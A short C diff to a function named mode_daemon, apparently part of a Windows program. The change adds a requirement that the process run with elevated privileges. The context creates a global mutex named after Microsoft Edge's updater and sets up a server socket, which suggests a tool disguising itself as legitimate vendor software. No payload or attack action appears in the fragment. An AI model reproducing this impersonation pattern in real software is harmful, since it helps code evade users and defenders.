@@ -74,6 +74,8 @@ int mode_daemon(void)
     char *path;
     SOCKET server_fd;
 
+    if (is_elevated() <= 0)
+        return (1);
     mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
     if (mutex == NULL)
     {
